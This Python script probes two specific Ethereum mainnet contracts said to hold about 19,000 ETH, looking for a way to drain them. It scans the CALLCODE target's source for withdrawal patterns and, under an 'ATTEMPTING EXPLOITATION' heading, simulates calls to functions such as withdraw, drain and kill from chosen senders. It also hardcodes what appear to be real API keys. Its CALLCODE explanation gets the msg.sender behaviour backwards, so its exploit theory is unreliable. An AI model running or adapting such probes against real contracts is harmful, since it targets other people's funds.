#!/usr/bin/env python3
"""
Investigate the CALLCODE target contract.
The 49-byte contracts delegate to 0x273930d21e01ee25e4c219b63259d214872220a2
This could be exploitable!
"""

import requests
from eth_abi import decode, encode
from eth_utils import keccak

RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c"
ETHERSCAN_API = "https://api.etherscan.io/v2/api"
ETHERSCAN_KEY = "5UWN6DNT7UZCEJYNE3J6FCVAWH4QJW255K"

# Target of CALLCODE
CALLCODE_TARGET = "0x273930d21e01ee25e4c219b63259d214872220a2"

# Contracts using CALLCODE to target
PROXIES = [
    "0x10abe2494e4525f8cd2bac772671f0e1a44c6975",  # 10060 ETH
    "0x88aa042c4aae423e0f1bb48542b473d1dd20a807",  # 9383 ETH
]

def get_function_selector(sig):
    return "0x" + keccak(text=sig).hex()[:8]

def eth_call(to, data, value=None, sender=None):
    call_params = {"to": to, "data": data}
    if sender:
        call_params["from"] = sender
    if value:
        call_params["value"] = hex(value)

    payload = {
        "jsonrpc": "2.0",
        "method": "eth_call",
        "params": [call_params, "latest"],
        "id": 1
    }
    try:
        resp = requests.post(RPC_URL, json=payload, timeout=10)
        return resp.json()
    except Exception as e:
        return {"error": str(e)}

def get_code(address):
    payload = {
        "jsonrpc": "2.0",
        "method": "eth_getCode",
        "params": [address, "latest"],
        "id": 1
    }
    try:
        resp = requests.post(RPC_URL, json=payload, timeout=10)
        return resp.json().get("result", "0x")
    except:
        return "0x"

def get_eth_balance(address):
    payload = {
        "jsonrpc": "2.0",
        "method": "eth_getBalance",
        "params": [address, "latest"],
        "id": 1
    }
    try:
        resp = requests.post(RPC_URL, json=payload, timeout=10)
        return int(resp.json().get("result", "0x0"), 16)
    except:
        return 0

def get_contract_source(address):
    url = f"{ETHERSCAN_API}?chainid=1&module=contract&action=getsourcecode&address={address}&apikey={ETHERSCAN_KEY}"
    try:
        resp = requests.get(url, timeout=30)
        data = resp.json()
        if data.get('status') == '1' and data.get('result'):
            return data['result'][0]
    except:
        pass
    return None

def decode_uint256(hex_result):
    if not hex_result or hex_result == "0x" or len(hex_result) < 66:
        return 0
    return int(hex_result[:66], 16)

def main():
    print("=" * 70)
    print("CALLCODE TARGET INVESTIGATION")
    print("=" * 70)

    # Check the target contract
    print(f"\nCALLCODE Target: {CALLCODE_TARGET}")

    balance = get_eth_balance(CALLCODE_TARGET)
    print(f"Target ETH Balance: {balance / 1e18:.4f} ETH")

    code = get_code(CALLCODE_TARGET)
    code_size = (len(code) - 2) // 2
    print(f"Target Code Size: {code_size} bytes")

    # Get source code
    source_data = get_contract_source(CALLCODE_TARGET)
    if source_data:
        print(f"Contract Name: {source_data.get('ContractName', 'Unknown')}")
        print(f"Compiler: {source_data.get('CompilerVersion', 'Unknown')}")

        source_code = source_data.get('SourceCode', '')
        if source_code:
            with open('callcode_target.sol', 'w') as f:
                f.write(source_code)
            print(f"Source saved to callcode_target.sol")
    else:
        print("No verified source code")

    # Probe the target contract
    print("\n--- PROBING TARGET CONTRACT ---")

    probes = [
        "owner()",
        "withdraw()",
        "kill()",
        "destroy()",
        "sweepCommission()",
        "collectPercentOfFees()",
        "suicide(address)",
        "selfdestruct(address)",
    ]

    for probe in probes:
        selector = get_function_selector(probe)
        result = eth_call(CALLCODE_TARGET, selector)
        if 'result' in result and result['result'] != '0x':
            print(f"  {probe}: {result['result'][:66]}")
        elif 'error' in result:
            err = result.get('error', {})
            if isinstance(err, dict):
                msg = err.get('message', str(err))[:50]
            else:
                msg = str(err)[:50]
            if 'revert' not in msg.lower() and 'invalid opcode' not in msg.lower():
                print(f"  {probe}: {msg}")

    # Now test through the proxy
    print("\n" + "=" * 70)
    print("TESTING THROUGH PROXY")
    print("=" * 70)

    for proxy in PROXIES:
        print(f"\n--- Proxy: {proxy} ---")
        balance = get_eth_balance(proxy)
        print(f"ETH Balance: {balance / 1e18:.2f} ETH")

        # Try withdrawal functions
        for func in ["withdraw()", "kill()", "sweepCommission()", "collectPercentOfFees()"]:
            selector = get_function_selector(func)
            result = eth_call(proxy, selector)
            if 'result' in result:
                ret = result['result']
                if ret and ret != '0x':
                    print(f"  {func}: {ret[:66]}")
                else:
                    print(f"  {func}: empty/0x")

        # Try with value
        result = eth_call(proxy, "0x", value=0)
        print(f"  Empty call: {result.get('result', 'error')[:40]}")

    # Understand CALLCODE mechanics
    print("\n" + "=" * 70)
    print("CALLCODE MECHANICS ANALYSIS")
    print("=" * 70)
    print("""
CALLCODE vs DELEGATECALL:
- Both execute target code in the context of caller
- CALLCODE: msg.sender is preserved (the original caller)
- DELEGATECALL: msg.sender is the EOA that started the transaction

In this case:
1. User calls proxy contract
2. Proxy does CALLCODE to 0x273930d21e01ee25e4c219b63259d214872220a2
3. Target code runs with proxy's storage BUT msg.sender is caller

POTENTIAL EXPLOIT:
If the target contract has a function like:
    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }

When called through CALLCODE:
- It would use PROXY's balance (10,000+ ETH!)
- It would send to the original caller
- This could be a MASSIVE exploit!

CHECKING IF EXPLOITABLE...
""")

    # Check if the target has withdrawal patterns
    if source_data and source_code:
        print("\nSearching source code for withdraw patterns...")
        lower = source_code.lower()

        patterns = {
            'withdraw': 'withdraw' in lower,
            'transfer': '.transfer(' in lower,
            'send': '.send(' in lower,
            'call.value': '.call.value' in lower,
            'selfdestruct': 'selfdestruct' in lower or 'suicide' in lower,
            'msg.sender': 'msg.sender' in lower,
            'owner': 'owner' in lower,
        }

        for name, found in patterns.items():
            if found:
                print(f"  Found: {name}")

        # Look for any permissionless transfer functions
        if patterns['transfer'] and not patterns['owner']:
            print("\n!!! POTENTIAL EXPLOIT: Transfer without owner check !!!")
        elif patterns['selfdestruct']:
            print("\n!!! POTENTIAL EXPLOIT: Selfdestruct found !!!")

    # Try calling specific functions that might withdraw
    print("\n" + "=" * 70)
    print("ATTEMPTING EXPLOITATION")
    print("=" * 70)

    # These are functions that might send ETH
    dangerous_funcs = [
        ("withdraw()", None),
        ("withdrawAll()", None),
        ("claim()", None),
        ("collect()", None),
        ("sweep()", None),
        ("drain()", None),
        ("execute()", None),
        ("run()", None),
        ("payout()", None),
        ("refund()", None),
        ("exit()", None),
    ]

    for proxy in PROXIES:
        print(f"\nProxy: {proxy} ({get_eth_balance(proxy) / 1e18:.2f} ETH)")

        for func, params in dangerous_funcs:
            selector = get_function_selector(func)

            # Try as different senders
            for sender in [None, "0x0000000000000000000000000000000000000001"]:
                result = eth_call(proxy, selector, sender=sender)

                if 'result' in result and result['result'] not in ['0x', None]:
                    print(f"  {func}: RESPONDS - {result['result'][:40]}...")

if __name__ == "__main__":
    main()
